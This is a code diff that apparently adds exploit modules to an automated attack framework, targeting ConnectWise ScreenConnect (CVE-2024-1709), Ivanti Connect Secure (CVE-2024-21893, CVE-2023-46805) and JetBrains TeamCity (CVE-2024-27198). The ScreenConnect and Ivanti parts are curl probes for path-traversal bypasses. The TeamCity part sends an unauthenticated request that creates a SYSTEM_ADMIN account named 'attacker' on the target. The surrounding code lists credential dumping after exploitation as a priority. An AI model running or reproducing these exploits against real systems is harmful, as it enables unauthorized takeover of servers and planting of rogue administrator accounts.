@@ -18942,6 +18942,88 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                     "cve": "CVE-2023-38646",
                 }], target)
 
+        # ── CVE-2024-1709 ConnectWise ScreenConnect auth bypass ────────────────
+        sc_ports = [p for p in open_ports if p["port"] in (8040, 8041, 443, 80) or "screenconnect" in p.get("version","").lower()]
+        for scp in sc_ports[:2]:
+            sc_port = scp["port"]
+            sc_proto = "https" if sc_port in (443, 8041) else "http"
+            sc_out, _ = self._run_cmd(
+                f"screenconnect-1709-{sc_port}",
+                f"curl -sk --max-time 8 '{sc_proto}://{target}:{sc_port}/SetupWizard.aspx' 2>/dev/null | "
+                f"grep -qi 'ConnectWise\\|ScreenConnect' && echo 'SCREENCONNECT_DETECTED'; "
+                f"# CVE-2024-1709: auth bypass via /SetupWizard.aspx/..\n"
+                f"CODE=$(curl -sk --max-time 8 -o /dev/null -w '%{{http_code}}' "
+                f"'{sc_proto}://{target}:{sc_port}/SetupWizard.aspx/..' 2>/dev/null); "
+                f"echo \"SetupWizard bypass: $CODE\"; "
+                f"[ \"$CODE\" = '200' ] && echo 'SCREENCONNECT_CVE_2024_1709_POSSIBLE'",
+                target, timeout=20,
+            )
+            if "SCREENCONNECT" in sc_out:
+                self._capture_evidence(sc_out, target, f"screenconnect-{sc_port}", "CVE-2024-1709")
+                accumulated_output.append(f"=== ConnectWise ScreenConnect CVE-2024-1709 ===\n{sc_out[:300]}")
+                self._save_findings([{
+                    "title": f"ConnectWise ScreenConnect CVE-2024-1709 Auth Bypass @ {target}:{sc_port}",
+                    "severity": "critical",
+                    "description": f"ScreenConnect vulnerable a auth bypass via /SetupWizard.aspx/.. → RCE.\n{sc_out[:200]}",
+                    "cve": "CVE-2024-1709",
+                }], target)
+
+        # ── CVE-2024-21893 Ivanti Connect Secure SSRF ─────────────────────────
+        for ivanti_port in [p["port"] for p in open_ports if p["port"] in (443, 8443, 4433)]:
+            iv_proto = "https"
+            iv_out, _ = self._run_cmd(
+                f"ivanti-21893-{ivanti_port}",
+                f"# CVE-2024-21893 - SSRF in SAML component\n"
+                f"curl -sk --max-time 10 "
+                f"'{iv_proto}://{target}:{ivanti_port}/dana-na/auth/saml-endpoint.cgi' "
+                f"-d 'getRequest=1' 2>/dev/null | grep -qi 'ivanti\\|pulse\\|secure' && echo 'IVANTI_DETECTED'; "
+                f"# CVE-2023-46805 auth bypass check\n"
+                f"curl -sk --max-time 10 "
+                f"'{iv_proto}://{target}:{ivanti_port}/api/v1/totp/user-backup-code/../../' 2>/dev/null | "
+                f"grep -qi 'ivanti\\|pulse' && echo 'IVANTI_CVE_2023_46805_POSSIBLE'",
+                target, timeout=20,
+            )
+            if "IVANTI_DETECTED" in iv_out:
+                self._capture_evidence(iv_out, target, f"ivanti-{ivanti_port}", "CVE-2024-21893/CVE-2023-46805")
+                accumulated_output.append(f"=== Ivanti Connect Secure CVE-2024-21893 ===\n{iv_out[:300]}")
+                self._save_findings([{
+                    "title": f"Ivanti Connect Secure Detectado — CVE-2024-21893/CVE-2023-46805 @ {target}:{ivanti_port}",
+                    "severity": "critical",
+                    "description": f"Ivanti Connect Secure expuesto. Verificar CVE-2024-21893 SSRF y CVE-2023-46805 auth bypass.\n{iv_out[:200]}",
+                    "cve": "CVE-2024-21893",
+                }], target)
+
+        # ── CVE-2024-27198 JetBrains TeamCity RCE ─────────────────────────────
+        tc_new_ports = [p for p in open_ports if p["port"] in (8111, 8112) or "teamcity" in p.get("version","").lower()]
+        for tcp in tc_new_ports[:1]:
+            tc_port = tcp["port"]
+            jb_out, _ = self._run_cmd(
+                f"jetbrains-tc-27198-{tc_port}",
+                f"# CVE-2024-27198 — auth bypass via /app/rest/openapi.json\n"
+                f"VER=$(curl -s --max-time 8 'http://{target}:{tc_port}/app/rest/server?fields=version' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"version\",\"\"))' 2>/dev/null); "
+                f"echo \"TeamCity version: $VER\"; "
+                f"# Bypass check\n"
+                f"TOKEN=$(curl -s --max-time 10 -X POST "
+                f"'http://{target}:{tc_port}/app/rest/users' "
+                f"-H 'Content-Type: application/json' "
+                f"-H 'Origin: http://{self.lhost}' "
+                f"-d '{{\"username\":\"attacker\",\"password\":\"attacker\",\"email\":\"a@a.com\",\"roles\":{{\"role\":[{{\"roleId\":\"SYSTEM_ADMIN\",\"scope\":\"g\"}}]}}}}' "
+                f"2>/dev/null); "
+                f"echo \"$TOKEN\" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"id\",\"\"))' 2>/dev/null && echo 'TC_27198_USER_CREATED'",
+                target, timeout=25,
+            )
+            if "TC_27198_USER_CREATED" in jb_out or "TeamCity version" in jb_out:
+                self._capture_evidence(jb_out, target, f"tc-27198-{tc_port}", "CVE-2024-27198")
+                accumulated_output.append(f"=== TeamCity CVE-2024-27198 ===\n{jb_out[:400]}")
+                if "TC_27198_USER_CREATED" in jb_out:
+                    self._save_findings([{
+                        "title": f"TeamCity CVE-2024-27198 Auth Bypass → Admin Creado @ {target}:{tc_port}",
+                        "severity": "critical",
+                        "description": f"TeamCity permite crear usuario SYSTEM_ADMIN sin autenticación.\n{jb_out[:300]}",
+                        "cve": "CVE-2024-27198",
+                    }], target)
+
     def _vuln_chain_engine(self, target, open_ports, accumulated_output):
         """C1: Auto-chain detected vulns into deeper exploits."""
         self._log(f"[C1-CHAIN] Analizando cadenas de explotación para {target}")
